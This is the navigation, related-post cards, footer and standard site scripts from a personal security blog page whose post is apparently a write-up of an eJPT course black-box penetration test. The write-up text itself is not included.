href="https://www.facebook.com/sharer/sharer.php?title=PTS: Black-Box Penetration Test 1 - Robin Goyal&u=https://robgoyal.github.io/posts/black-box-pentest-1/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://robgoyal.github.io/posts/black-box-pentest-1/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/configure-raspberry-pi-from-scratch/">Configure a Raspberry Pi from scratch</a><li><a href="/posts/pbs-rpi/">Proxmox Backup Server on Raspberry Pi</a><li><a href="/posts/thm-basic-pentesting/">Basic Pentesting (Try Hack Me)</a><li><a href="/posts/thm-gamezone/">Gamezone (Try Hack Me)</a><li><a href="/posts/thm-overpass/">Overpass (Try Hack Me)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/web-application/">web application</a> <a class="post-tag" href="/tags/ejpt/">eJPT</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/reverse-shell/">reverse shell</a> <a class="post-tag" href="/tags/brute-force/">brute force</a> <a class="post-tag" href="/tags/ine/">INE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/black-box-pentest-2/"><div class="card-body"> <span class="timeago small" >Aug 21, 2021<i class="unloaded">2021-08-21T12:00:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PTS: Black-Box Penetration Test 2</h3><div class="text-muted small"><p> This is the 2nd writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification. Scenario ...</p></div></div></a></div><div class="card"> <a href="/posts/black-box-pentest-3/"><div class="card-body"> <span class="timeago small" >Aug 22, 2021<i class="unloaded">2021-08-22T11:00:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>PTS: Black-Box Penetration Test 3</h3><div class="text-muted small"><p> This is the 3rd writeup of 3 black-box penetration tests offered in INE’s Penetration Testing Student course that I am currently doing in my journey to obtain the eJPT certification. Scenario ...</p></div></div></a></div><div class="card"> <a href="/posts/thm-basic-pentesting/"><div class="card-body"> <span class="timeago small" >Sep 17, 2021<i class="unloaded">2021-09-17T18:00:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Basic Pentesting (Try Hack Me)</h3><div class="text-muted small"><p> I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/black-box-pentest-2/" class="btn btn-outline-primary" prompt="Newer"><p>PTS: Black-Box Penetration Test 2</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/robgoyal">Robin Goyal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/web-application/">web application</a> <a class="post-tag" href="/tags/ejpt/">eJPT</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/reverse-shell/">reverse shell</a> <a class="post-tag" href="/tags/brute-force/">brute force</a> <a class="post-tag" href="/tags/ine/">INE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://robgoyal.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
